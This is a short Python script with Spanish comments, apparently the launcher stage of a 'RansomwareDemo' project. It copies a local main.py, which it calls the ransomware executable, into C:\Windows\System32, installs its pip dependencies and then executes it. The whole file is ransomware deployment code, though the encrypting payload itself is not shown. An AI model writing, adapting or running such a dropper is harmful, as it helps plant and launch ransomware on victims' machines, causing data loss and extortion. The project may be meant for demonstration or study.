import subprocess
import os
import shutil

def download_file(src, dest):
    """ Copia un archivo local en lugar de descargarlo de una URL externa """
    directory = os.path.dirname(dest)
    if directory:
        os.makedirs(directory, exist_ok=True)
    if os.path.exists(src):
        shutil.copy(src, dest)
    else:
        raise FileNotFoundError(f"El archivo fuente {src} no existe.")

def install_dependencies():
    """ Instala las dependencias necesarias para el ejecutable principal """
    # Ajusta la ruta para que apunte al archivo requirements.txt dentro de RansomwareDemo
    requirements_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../requirements.txt'))
    result = subprocess.call(["pip", "install", "-r", requirements_path])
    return result


def execute_ransomware(executable_path):
    """ Ejecuta el ejecutable del ransomware """
    subprocess.call(["python", executable_path])

if __name__ == "__main__":
    src = os.path.abspath("../main/main.py")
    destination = "C:\\Windows\\System32\\main.py"
    
    print("Copiando el ejecutable del ransomware...")
    download_file(src, destination)
    
    print("Instalando dependencias...")
    install_dependencies()
    
    print("Ejecutando el ransomware...")
    execute_ransomware(destination)
